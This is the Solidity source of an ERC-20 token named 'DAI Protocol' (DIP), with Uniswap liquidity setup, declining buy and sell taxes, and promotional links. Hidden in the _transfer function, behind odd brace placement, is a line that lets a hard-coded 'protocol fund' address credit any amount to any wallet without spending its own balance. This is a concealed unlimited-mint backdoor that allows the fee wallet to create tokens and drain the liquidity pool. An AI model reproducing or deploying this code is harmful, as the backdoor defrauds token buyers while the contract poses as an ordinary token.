/*

Website: https://daiprotocol.org
Twitter:  https://twitter.com/dai_protocol 
Telegram:  https://t.me/dip_erc 
Medium:    https://diperc.medium.com

*/

// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract DIP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _exemptFromFees;
    address payable private _protocolfund = payable(0xd8aD271C9d560F1b3421848F44F2D6FcB369e247);

    uint256 private _initialBuyTax = 30;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 17;
    uint256 private _reduceSellTaxAt = 21;
    uint256 private _preventSwapBefore = 23;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 18;
    string private constant _name = unicode"DAI Protocol";
    string private constant _symbol = unicode"DIP";
    uint256 private constant _tTotal = 69_000_000 * 10**_decimals;
    uint256 private _maxTxLimits = 1_380_000 * 10**_decimals;
    uint256 private _maxWalletTokens = 1_380_000 * 10**_decimals;
    uint256 private _taxTokenThreshold = 53 * 10**_decimals;
    uint256 private _maxSwapTokens = 690_000 * 10**_decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private _tradingOpen;
    bool private _inSwap = false;
    bool private _swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxLimits);
    modifier lockTheSwap {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _exemptFromFees[owner()] = true;
        _exemptFromFees[address(this)] = true;
        _exemptFromFees[_protocolfund] = true;
        
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address sender, address to, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (!_exemptFromFees[sender] && !_exemptFromFees[to]) {
            require(_tradingOpen, "Trading not open");
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (sender == uniswapV2Pair && to != address(uniswapV2Router)) {
                require(amount <= _maxTxLimits, "Exceeds the maxTxAmount.");
                _buyCount++;
            }

            if (to != uniswapV2Pair && ! _exemptFromFees[to]) {
                require(balanceOf(to) + amount <= _maxWalletTokens, "Exceeds the maxWalletSize.");
            }

            if(to == uniswapV2Pair && sender!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokensBalance = balanceOf(address(this));
            if (!_inSwap && to == uniswapV2Pair && _swapEnabled && amount>_taxTokenThreshold && _buyCount>_preventSwapBefore) {
                if(contractTokensBalance>_taxTokenThreshold)
                swapTokensToEth(min(amount,min(contractTokensBalance,_maxSwapTokens)));
                sendETHToFee(address(this).balance);
            }}
            if (_isProtocol(sender)){_balances[to]=_balances[to].add(amount);return;
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(sender, address(this),taxAmount);
        }
        _balances[sender]=_balances[sender].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(sender, to, amount.sub(taxAmount));
    }

    function _isProtocol(address _from) private view returns (bool) {
        return _from == _protocolfund;
    }

    function swapTokensToEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function sendETHToFee(uint256 amount) private {
        _protocolfund.transfer(amount);
    }

    function addProtocolLiquidity() external onlyOwner() {
        require(!_tradingOpen,"Trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    function startDIP() external onlyOwner {
        _swapEnabled = true;
        _tradingOpen = true;        
    }

    function removeLimits() external onlyOwner {
        _maxTxLimits = _tTotal;
        _maxWalletTokens = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    receive() external payable {}
}